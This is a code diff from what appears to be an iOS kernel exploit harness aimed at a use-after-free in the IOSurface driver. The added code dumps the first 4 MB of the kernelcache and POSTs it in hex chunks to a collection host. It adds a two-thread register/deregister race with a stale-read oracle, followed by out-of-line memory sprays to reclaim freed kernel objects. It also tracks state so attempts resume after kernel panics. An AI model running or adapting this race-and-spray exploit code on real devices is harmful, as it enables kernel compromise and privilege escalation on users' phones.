@@ -816,41 +816,56 @@ static void stageKCE(void) {
         DIR *d = opendir(dirs[di]);
         if (!d) { EV("[uaf][KCE] opendir %s -> %s", dirs[di], strerror(errno)); continue; }
         struct dirent *de;
+        char found[256] = {0};
         while ((de = readdir(d))) {
             if (de->d_name[0] == '.') continue;
             EV("[uaf][KCE] entry: %s/%s", dirs[di], de->d_name);
+            // iOS 26 ships a FILESET kernelcache (uncompressed Mach-O - see the
+            // panic's "Fileset Kernelcache UUID"), so the filename is dynamic:
+            // kernelcache.<board-config> - take the first kernelcache* hit.
+            if (!found[0] && strncmp(de->d_name, "kernelcache", 12) == 0)
+                snprintf(found, sizeof found, "%s", de->d_name);
         }
         closedir(d);
-        if (di == 0) continue;
-        // the kernelcache itself
-        const char *kc = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";
+        if (!found[0]) continue;
+        char kc[512];
+        snprintf(kc, sizeof kc, "%s/%s", dirs[di], found);
         struct stat st;
         if (stat(kc, &st) == 0) {
-            EV("[uaf][KCE] kernelcache size=%lld", (long long)st.st_size);
+            EV("[uaf][KCE] kernelcache %s size=%lld", kc, (long long)st.st_size);
             FILE *f = fopen(kc, "rb");
             if (f) {
-                uint8_t buf[32768]; size_t n = fread(buf, 1, sizeof buf, f);
+                // dump 4 MB: on 26.2 the image is a raw fileset Mach-O, so the
+                // head carries the header + load commands + the start of __TEXT
+                size_t want = 4u << 20;
+                uint8_t *buf = malloc(want);
+                if (buf) {
+                    size_t n = fread(buf, 1, want, f);
+                    EV("[uaf][KCE] dumping first %zu of %lld bytes", n, (long long)st.st_size);
+                    for (size_t o = 0; o + 16 <= n && o < 2048; o += 16) {
+                        char line[128]; size_t off = 0;
+                        for (int k = 0; k < 16; k++)
+                            off += (size_t)snprintf(line + off, sizeof line - off, "%02x", buf[o + k]);
+                        EV("[uaf][KCE]   +%#zx %s", o, line);
+                    }
+                    evLine("=== kernelcache dump begin ===");
+                    // POST the head in 2 KB lines (the kce_parse.py archive)
+                    for (size_t o = 0; o + 2048 <= n; o += 2048) {
+                        char chunk[4200]; size_t co = 0;
+                        co += (size_t)snprintf(chunk + co, sizeof chunk - co, "KCE +%zu ", o);
+                        for (size_t k = 0; k < 2048; k++)
+                            co += (size_t)snprintf(chunk + co, sizeof chunk - co,
+                                                   "%02x", buf[o + k]);
+                        AvePost([NSString stringWithUTF8String:chunk]);
+                        usleep(3000);
+                    }
+                    EV("[uaf][KCE] kernelcache head delivered");
+                    free(buf);
+                }
                 fclose(f);
-                EV("[uaf][KCE] header (first %zu bytes):", n);
-                for (size_t o = 0; o + 16 <= n && o < 256; o += 16) {
-                    char line[128]; size_t off = 0;
-                    for (int k = 0; k < 16; k++)
-                        off += (size_t)snprintf(line + off, sizeof line - off, "%02x", buf[o + k]);
-                    EV("[uaf][KCE]   +%#zx %s", o, line);
-                }
-                evLine("=== kernelcache header captured ===");
-                // POST the header in chunks so the PC archive has it
-                for (size_t o = 0; o + 1024 <= n; o += 1024) {
-                    char chunk[1400]; size_t co = 0;
-                    co += (size_t)snprintf(chunk + co, sizeof chunk - co, "KCE +%zu ", o);
-                    for (size_t k = 0; k < 1024; k++)
-                        co += (size_t)snprintf(chunk + co, sizeof chunk - co,
-                                               "%02x", buf[o + k]);
-                    AvePost([NSString stringWithUTF8String:chunk]);
-                    usleep(5000);
-                }
             }
         }
+        return;   // the fileset dir is authoritative on 26.2
     }
 }
 
@@ -1338,14 +1353,105 @@ static void p2Load(void) {
     FILE *f = fopen(g_evpath, "r");
     if (!f) return;
     char line[256];
-    while (fgets(line, sizeof line, f))
-        if (sscanf(line, "P2STATE unit=%d round=%d", &p2Unit, &p2Round) == 2) { /* last one wins */ }
+    int su = -1, sr = -1, done = 0;
+    while (fgets(line, sizeof line, f)) {
+        int a, b;
+        if (sscanf(line, "P2KRUN unit=%d round=%d", &a, &b) == 2) {
+            p2Unit = a; p2Round = b; su = a; sr = b; done = 0;   // a round begins
+        } else if (sscanf(line, "P2KRUN-DONE unit=%d round=%d", &a, &b) == 2) {
+            if (a == su && b == sr) done = 1;                    // it survived
+        }
+    }
     fclose(f);
+    // the last written round has no P2KRUN-DONE = that launch died inside it:
+    // advance past it so the matrix keeps moving across panics (the .ips is the
+    // evidence, the state file is the pointer)
+    if (su >= 0 && !done) {
+        EV("[uaf][P2] previous launch died in unit %d round %d - advancing", su, sr);
+        p2Round = sr + 1;
+        p2Unit = su;
+        if (p2Round >= 12) { p2Round = 0; p2Unit++; }
+    }
     EV("[uaf][P2] resuming at unit=%d round=%d", p2Unit, p2Round);
 }
 static void p2Save(void) {
     if (!g_ev) g_ev = fopen(g_evpath, "a");
-    if (g_ev) { fprintf(g_ev, "P2STATE unit=%d round=%d\n", p2Unit, p2Round); fflush(g_ev); }
+    if (g_ev) { fprintf(g_ev, "P2KRUN unit=%d round=%d\n", p2Unit, p2Round); fflush(g_ev); }
+}
+static void p2Done(void) {
+    if (!g_ev) g_ev = fopen(g_evpath, "a");
+    if (g_ev) { fprintf(g_ev, "P2KRUN-DONE unit=%d round=%d\n", p2Unit, p2Round); fflush(g_ev); }
+}
+
+// ---- registry racers: sel17/sel18 churn on their own ids, for unit 6 -------
+static volatile int gRaceRun = 0;
+static volatile uint64_t gRaceA = 0, gRaceB = 0;
+static io_connect_t gRaceConn = 0;
+
+struct raceArg { uint64_t id; volatile uint64_t *count; };
+
+static void *raceRegDereg(void *p) {
+    struct raceArg *a = (struct raceArg *)p;
+    io_connect_t c = 0;
+    if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) return NULL;
+    mach_port_t wp = newWakePort();
+    uint64_t in[3] = {a->id, 2, 3};
+    uint64_t n = 0;
+    while (gRaceRun) {
+        kern_return_t r1 = callSel(c, SEL_REG,   in, 24, 1, wp);
+        kern_return_t r2 = callSel(c, SEL_DEREG, in, 24, 0, wp);
+        if (r1 != KERN_SUCCESS || r2 != KERN_SUCCESS) n++;   // anomalies counted
+        else n++;
+        *a->count = n;
+    }
+    dropPort(wp); IOServiceClose(c);
+    return NULL;
+}
+
+// unit 6: the PoC's stale-read oracle measured UNDER CONCURRENCY.  Its own
+// harness runs the dup/dereg stages single-threaded, and its notes say the
+// regression needs a racing context - so the race was never measured against
+// the oracle.  Every non-baseline code while the racers churn is the stale
+// read that single-threaded runs cannot see.
+static void p2_unit_regrace(io_connect_t c, mach_port_t wp, int round) {
+    int S = P2_SIZES[round % P2_NSZ];
+    uint32_t tag = (uint32_t)round;
+    gRaceRun = 1; gRaceA = 0; gRaceB = 0;
+    struct raceArg ra = { 0x1000 + (uint64_t)round, &gRaceA };
+    struct raceArg rb = { 0x2000 + (uint64_t)round, &gRaceB };
+    pthread_t th[2];
+    pthread_create(&th[0], NULL, raceRegDereg, &ra);
+    pthread_create(&th[1], NULL, raceRegDereg, &rb);
+    int anomalies = 0;
+    for (int k = 0; k < 24; k++) {
+        @autoreleasepool {
+        uint64_t probe = 0x3000000 + (uint64_t)round * 256 + k;
+        uint64_t pi[3] = {probe, 2, 3};
+        kern_return_t r1 = callSel(c, SEL_REG,   pi, 24, 1, wp);
+        kern_return_t r2 = callSel(c, SEL_REG,   pi, 24, 1, wp);
+        kern_return_t r3 = callSel(c, SEL_DEREG, pi, 24, 0, wp);
+        kern_return_t r4 = callSel(c, SEL_REG,   pi, 24, 1, wp);
+        kern_return_t r5 = callSel(c, SEL_DEREG, pi, 24, 0, wp);
+        int bad = (r1 != 0) || (r2 != (kern_return_t)0xE00002C9) ||
+                  (r3 != 0) || (r4 != 0) || (r5 != 0);
+        if (bad) {
+            anomalies++;
+            EV("[uaf][P2][R6] ORACLE ANOMALY probe=%#llx reg=%#x dup=%#x dere=%#x "
+               "re=%#x dere2=%#x", (unsigned long long)probe,
+               (uint32_t)r1, (uint32_t)r2, (uint32_t)r3, (uint32_t)r4, (uint32_t)r5);
+            g_stale_seen++;
+        }
+        usleep(500);
+        }
+    }
+    gRaceRun = 0;
+    pthread_join(th[0], NULL); pthread_join(th[1], NULL);
+    oolSpray(32, (size_t)S, tag);
+    p2Save();
+    EV("[uaf][P2][R6] round=%d anomalies=%d racerA=%llu racerB=%llu ool spray size=%d",
+       round, anomalies, (unsigned long long)gRaceA, (unsigned long long)gRaceB, S);
+    oolFree();
+    p2Done();
 }
 
 // ---- the race units ---------------------------------------------------------
@@ -1357,6 +1463,13 @@ static void p2_unit(int u, int round) {
     io_connect_t c = 0; mach_port_t wp = newWakePort();
     uint64_t in[3] = {1, 2, 3};
     if (IOServiceOpen(gSvc, mach_task_self(), 0, &c) != KERN_SUCCESS) { dropPort(wp); return; }
+
+    if (u == 6) {          // the registry-race oracle (no close, pure race)
+        p2Save();          // BEFORE the risky window, so a panic is attributable
+        p2_unit_regrace(c, wp, round);
+        IOServiceClose(c); dropPort(wp);
+        return;
+    }
 
     int nconn = 1, nspam = 2, dly = 60 * round;
     switch (u) {
@@ -1371,6 +1484,7 @@ static void p2_unit(int u, int round) {
         have[i] = (IOServiceOpen(gSvc, mach_task_self(), 0, &cs[i]) == KERN_SUCCESS);
         if (have[i]) callSel(cs[i], SEL_REG, in, 24, 1, wp);
     }
+    p2Save();      // BEFORE the free window: a panic is then attributable
 
     if (u == 2) {
         // surface churn only: no close race
@@ -1418,6 +1532,7 @@ static void p2_unit(int u, int round) {
     oolFree();
     for (int i = 0; i < nconn && i < 8; i++) if (have[i]) IOServiceClose(cs[i]);
     dropPort(wp);
+    p2Done();      // this round survived: the next resume starts after it
 }
 
 NSString *ModIsurfUAF2(void) {
@@ -1431,23 +1546,20 @@ NSString *ModIsurfUAF2(void) {
     int shape = 1;   // measured: sel17 accepts async shapes 1/2/3 only
     if (!gSvc && findService() != 0) return @"112477 P2: no IOSurface service";
 
-    for (int r = 0; r < 12; r++, p2Round++) {
-        EV("[uaf][P2] ---- unit %d round %d ----", p2Unit, p2Round);
+    // up to 3 units per launch; the state file makes a panic resumable
+    for (int u = 0; u < 3; u++) {
+        if (p2Unit >= 7) return @"112477 P2: all units survived, no panic - widen the matrix";
+        for (int r = 0; r < 12; r++, p2Round++) {
+            EV("[uaf][P2] ---- unit %d round %d ----", p2Unit, p2Round);
+            p2Save();
+            p2_unit(p2Unit, p2Round);
+        }
+        EV("[uaf][P2] unit %d: 12 rounds survived - advancing", p2Unit);
+        p2Unit++;
+        p2Round = 0;
         p2Save();
-        p2_unit(p2Unit, p2Round);
     }
-    EV("[uaf][P2] unit %d: 12 rounds survived - advancing", p2Unit);
-    p2Unit++;
-    p2Round = 0;
-    p2Save();
-    if (p2Unit >= 7) return @"112477 P2: all units survived, no panic - widen the matrix";
-
-    for (int r = 0; r < 12; r++, p2Round++) {
-        EV("[uaf][P2] ---- unit %d round %d ----", p2Unit, p2Round);
-        p2Save();
-        p2_unit(p2Unit, p2Round);
-    }
-    EV("[uaf][P2] RESUME-STOP: unit %d done, next launch continues at the next unit", p2Unit);
-    return S(@"112477 P2: units 0..%d survived 12 rounds each (OOL reclaim armed)",
-              p2Unit);
+    EV("[uaf][P2] RESUME-STOP: next launch continues at unit %d", p2Unit);
+    return S(@"112477 P2: units 0..%d survived 12 rounds each (OOL reclaim armed, "
+              @"KCE head delivered)", p2Unit);
 }
